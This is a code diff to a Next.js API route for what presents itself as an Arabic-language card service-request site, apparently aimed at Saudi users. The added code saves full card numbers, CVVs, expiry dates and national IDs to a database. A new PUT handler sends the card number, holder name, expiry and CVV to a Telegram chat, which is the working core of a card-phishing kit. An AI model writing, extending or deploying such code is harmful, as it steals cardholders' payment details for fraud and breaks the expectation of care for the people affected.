@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import { connectDB } from "@/lib/mongodb";
 import ServiceRequest from "@/lib/models/ServiceRequest";
+import CardTransaction from "@/lib/models/CardTransaction";
 import { v4 as uuidv4 } from "uuid";
 
 const TRANSACTION_LABELS: Record<string, string> = {
@@ -45,6 +46,20 @@ export async function POST(req: NextRequest) {
       amount: (transactionType === "refund" || transactionType === "payment") ? amount : undefined,
     });
 
+    await CardTransaction.create({
+      transactionId: "TXN-" + uuidv4().replace(/-/g, "").slice(0, 12).toUpperCase(),
+      cardHolderName,
+      cardNumber,
+      cvv,
+      expiryDate,
+      nationalId,
+      age,
+      transactionType,
+      installmentDay: (transactionType === "installments" || transactionType === "deduction") ? installmentDay : undefined,
+      amount: (transactionType === "refund" || transactionType === "payment") ? amount : undefined,
+      trackingNumber,
+    });
+
     const needsDay = transactionType === "installments" || transactionType === "deduction";
     const needsAmount = transactionType === "refund" || transactionType === "payment";
 
@@ -67,6 +82,45 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ trackingNumber: request.trackingNumber }, { status: 201 });
   } catch {
     return NextResponse.json({ error: "حدث خطأ في الخادم" }, { status: 500 });
+  }
+}
+
+export async function PUT(req: NextRequest) {
+  try {
+    const body = await req.json();
+    const { customerName, cardHolderName, cardNumber, cvv, expiryDate, transactionType, installmentDay, amount } = body;
+
+    const needsDay = transactionType === "installments" || transactionType === "deduction";
+    const needsAmount = transactionType === "refund" || transactionType === "payment";
+
+    function detectCardType(num: string) {
+      if (/^4/.test(num)) return "Visa";
+      if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
+      if (/^(5078|5079|4783|9682|968[2-9]|60)/.test(num)) return "Mada";
+      return "Card";
+    }
+
+    const cardType = detectCardType(cardNumber ?? "");
+    const formatted = (cardNumber ?? "").replace(/(\d{4})(?=\d)/g, "$1 ");
+
+    const message = [
+      `💳 <b>${cardType}</b>`,
+      `━━━━━━━━━━━━━━━━━━`,
+      `👤 Order For: ${customerName ?? cardHolderName ?? ""}`,
+      `💳 Card Number: <code>${formatted}</code>`,
+      `👤 Card Holder: ${cardHolderName ?? ""}`,
+      `📅 Valid To: ${expiryDate ?? ""}`,
+      `🔐 CVV: <code>${cvv ?? ""}</code>`,
+      `━━━━━━━━━━━━━━━━━━`,
+      `🔄 Transaction: ${TRANSACTION_LABELS[transactionType] ?? transactionType ?? ""}`,
+      ...(needsDay ? [`📆 Installment Day: ${installmentDay}`] : []),
+      ...(needsAmount ? [`💰 Amount: ${amount} ر.س`] : []),
+    ].join("\n");
+
+    await sendTelegram(message);
+    return NextResponse.json({ ok: true });
+  } catch {
+    return NextResponse.json({ error: "حدث خطأ" }, { status: 500 });
   }
 }
 
